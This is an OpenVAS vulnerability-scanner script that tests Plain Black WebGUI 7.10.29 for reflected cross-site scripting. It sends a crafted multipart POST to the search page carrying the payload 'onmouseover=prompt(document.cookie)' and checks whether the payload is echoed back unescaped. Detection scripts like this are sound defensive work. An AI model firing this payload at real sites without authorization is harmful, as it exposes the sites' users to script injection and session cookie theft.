###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webgui_search_xss_vuln.nasl 11424 2018-09-17 08:03:52Z mmartin $
#
# Plain Black WebGUI 'search' Cross-Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802090");
  script_version("$Revision: 11424 $");
  script_bugtraq_id(72253);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-01-23 11:27:32 +0530 (Fri, 23 Jan 2015)");
  script_name("Plain Black WebGUI 'search' Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Plain Black
  WebGUI and is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is able read the cookie or not.");

  script_tag(name:"insight", value:"The error exists as the style_underground/search
  script does not validate input before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to
  execute arbitrary HTML and script code in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"Plain Black WebGUI version 7.10.29.
  Previous version maybe vulnerable also.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130005");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jan/79");
  script_xref(name:"URL", value:"http://secupent.com/exploit/WebGUI-7.10.29-XSS.txt");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


http_port = get_http_port(default:80);

host = http_host_name( port:http_port );

foreach dir (make_list_unique("/", "/WebGUI", "/webgui", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  url = dir + "/style-underground/search";

  sndReq = http_get(item: url, port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(rcvRes && ">WebGUI Links<" >< rcvRes)
  {
    cookie = eregmatch(pattern:"Cookie: (wgSession=.*; path=)", string:rcvRes);
    if(cookie){
      cookie = cookie[0] - '; path=';
    }

    postdata = string("-----------------------------99533922720439277032114782214\r\n",
                    'Content-Disposition: form-data; name="doit"\r\n',
                    '\r\n',
                    '1\r\n',
                    '-----------------------------99533922720439277032114782214\r\n',
                    'Content-Disposition: form-data; name="keywords"\r\n',
                    '\r\n',
                    '1" onmouseover=prompt(document.cookie) bad="\r\n',
                    '-----------------------------99533922720439277032114782214--\r\n');


    sndReq =  string('POST ', url, ' HTTP/1.1\r\n',
                   'Host: ', host, '\r\n',
                   'Referer: http://', host, dir, '/style-underground/search\r\n',
                    cookie,'\r\n',
                   'Content-Type: multipart/form-data; boundary=---------------------------99533922720439277032114782214\r\n',
                   'Content-Length: ', strlen(postdata), '\r\n\r\n',
                    postdata);

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    if(rcvRes && "onmouseover=prompt(document.cookie)" >< rcvRes
              && ">WebGUI Links<" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
